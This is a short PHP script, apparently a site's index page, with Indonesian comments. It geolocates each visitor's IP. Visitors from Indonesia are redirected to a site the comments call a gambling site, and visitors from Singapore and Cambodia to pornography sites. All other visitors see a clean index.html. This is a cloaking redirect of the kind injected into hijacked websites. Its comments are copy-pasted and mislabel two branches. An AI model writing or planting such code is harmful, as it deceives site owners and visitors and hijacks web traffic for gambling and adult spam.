<?php
function getCountryCode() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $response = @file_get_contents("http://ip-api.com/json/$ip");
    if ($response) {
        $data = json_decode($response, true);
        return $data['countryCode'] ?? '';
    }
    return '';
}

$countryCode = getCountryCode();

if ($countryCode === 'ID') {
    // Jika dari Indonesia → redirect ke situs judi
    header("Location: https://a.com/");
    exit;
}
if ($countryCode === 'SG') {
    // Jika dari Indonesia → redirect ke situs judi
    header("Location: https://www.pornhub.com/");
    exit;
}
if ($countryCode === 'KH') {
    // Jika dari Indonesia → redirect ke situs judi
    header("Location: https://spankbang.com/");
    exit;
}

// Jika bukan dari Indonesia → lanjutkan ke halaman bersih
// Tampilkan isi index.html dari domain yang sama
readfile("index.html");
exit;
?>
